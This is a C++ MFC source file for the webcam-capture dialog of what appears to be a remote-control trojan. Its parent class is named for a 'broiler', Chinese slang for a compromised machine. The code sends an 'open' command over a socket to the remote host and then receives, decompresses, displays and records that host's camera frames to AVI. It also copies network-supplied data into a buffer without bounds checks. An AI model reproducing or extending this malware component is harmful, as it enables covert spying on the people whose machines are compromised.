// VideoDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "VideoDlg.h"
#include "BroilerData.h"


// CVideoDlg 对话框

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

CVideoDlg::CVideoDlg(CWnd* pParent /*=NULL*/,  SOCKET sock)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_socket = sock;
	m_pAviFile = NULL;
	m_pCompress = NULL;
	m_pUnCompress = NULL;
}

CVideoDlg::~CVideoDlg()
{
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_RECORDS, &CVideoDlg::OnBnClickedBtnRecords)
	ON_BN_CLICKED(IDC_BTN_RECORDE, &CVideoDlg::OnBnClickedBtnRecorde)
END_MESSAGE_MAP()


// CVideoDlg 消息处理程序
BOOL CVideoDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
 	// TODO:  在此添加额外的初始化
	DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CVideoDlg::DlgInit()
{
	CString OnlineIP = _T("");

	SetWindowText(_T("[视频捕捉] ")+OnlineIP);

	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_CAMERA), FALSE);	
	CenterWindow();	
	// TODO: Add extra initialization here
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1300001);
	int strPartDim[2]= {250,-1};
	m_wndStatusBar.SetParts(2,strPartDim);

	//create picture box
	m_PicBox.Create(NULL, NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_HSCROLL | WS_VSCROLL, CRect(0, 0, 1, 1), this, 0);
	CRect rc;
	GetClientRect(&rc);
	rc.bottom -= 50;
	m_PicBox.MoveWindow(&rc);
	m_PicBox.SetTipText(_T("请稍后，设备正在初始化……"));

	SendVideoStartMsg();
}

void CVideoDlg::StatusTextOut(int iPane,LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

void CVideoDlg::SendVideoStartMsg()
{
	char strMsg[] = "open";  //开启线程
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_VIDEO_VIEW;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

DWORD CVideoDlg::RecvVideo(IN VIDEODATA_C tagVideoData) 
{
	switch(tagVideoData.Id)
	{
	case 0:   //头信息
		{
			m_pBmpheader = (BITMAPINFO*)LocalAlloc(LPTR, tagVideoData.HeadSize);
			memcpy(m_pBmpheader, &tagVideoData.bmpinfo, tagVideoData.HeadSize);
			m_pCompress = new BYTE[tagVideoData.dwExtend2];    //压缩后的 //申请内存空间
			m_pUnCompress = new BYTE[tagVideoData.dwExtend1];  //未压缩的
			memset(m_pCompress, 0, tagVideoData.dwExtend2);
		}
		break;
	case 1:  //位图数据
		{
			//复制数据
			for(int i= tagVideoData.Begin, j = 0 ; j < SCREEN_BUF_SIZE; i++, j++)
			{
				m_pCompress[i] = tagVideoData.Data[j];
			}
		}
		break;
	case 2:  //最后一次复制数据
		{
			for(int i= tagVideoData.Begin, j=0; i<tagVideoData.Size; i++,j++)
			{
				m_pCompress[i] = tagVideoData.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("未知的图像数据ID"),_T("提示"),MB_OK);
			delete[] m_pCompress;
			LocalFree(m_pBmpheader);
			return 1;
		}
	}
	//判断传送完以后是否可以显示图像
	if (tagVideoData.bShow)
	{
		DWORD lenthUncompress= tagVideoData.dwExtend1;  //未压缩的
		uncompress(m_pUnCompress,
			       &lenthUncompress,
				   m_pCompress,
				   tagVideoData.dwExtend2);  //解压数据
		//显示图像
		HBITMAP hBitmap = GetBitmapFromData(m_pBmpheader, m_pUnCompress);
		if(m_pAviFile != NULL)
		{
			m_pAviFile->AppendNewFrame(hBitmap);
		}
		m_PicBox.SetBitmap(hBitmap);

		delete [] m_pCompress;
		delete [] m_pUnCompress;
	}
	return 0;
}

void CVideoDlg::VideoStop()
{

}

HBITMAP CVideoDlg::GetBitmapFromData(LPBITMAPINFO lpBmpInfo, BYTE* pDibData)
{
	HBITMAP hBitmap;

	HDC hDC = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
	// 创建DDB位图
	hBitmap = CreateDIBitmap(hDC,
		                     &lpBmpInfo->bmiHeader,
							 CBM_INIT,
							 pDibData,
							 lpBmpInfo,
							 DIB_RGB_COLORS);

	DeleteDC(hDC);
	return hBitmap;
}

//开始录像
void CVideoDlg::OnBnClickedBtnRecords()
{
	// TODO: 在此添加控件通知处理程序代码
	CString strAVIFile,strAVIName;
	CFileDialog dlgFileOpen(FALSE, _T(".avi"), NULL, OFN_HIDEREADONLY, _T("AVI Files(*.avi)|*.avi||"));
	if (dlgFileOpen.DoModal() != IDOK)
	{
		return;
	}
	strAVIFile = dlgFileOpen.GetPathName();	
	strAVIName = dlgFileOpen.GetFileName();

	if(strAVIFile.IsEmpty())
	{
		MessageBox(_T("录像文件名称不能为空,开始录像失败"),_T("开始录像"),MB_ICONEXCLAMATION | MB_ICONERROR);
		return;
	}

	if(m_pAviFile != NULL)
	{
		delete m_pAviFile;
	}
	m_pAviFile = new CAviFile(strAVIFile, 0, 4);
	if (!m_pAviFile)
	{
		::MessageBox(this->m_hWnd, _T("新建视频录像文件失败"),_T("开始录像"), MB_ICONEXCLAMATION | MB_ICONERROR);
	}
	else
	{
		StatusTextOut(0,_T("录制为文件: %s"), strAVIName);
		GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(FALSE);
		GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(TRUE);
	}
}

//停止录像
void CVideoDlg::OnBnClickedBtnRecorde()
{
	// TODO: 在此添加控件通知处理程序代码
	if(m_pAviFile != NULL)
	{
		delete m_pAviFile;
	}
	m_pAviFile = NULL;

	StatusTextOut(0 , _T(""));
	GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(FALSE);	
}

void CVideoDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	char strMsg[] = "quit";   //退出线程
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_VIDEO_VIEW;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //发送退出信息
	Sleep(30);
	DestroyWindow();
	delete this;
}

void CVideoDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pVideoDlg = NULL;
}

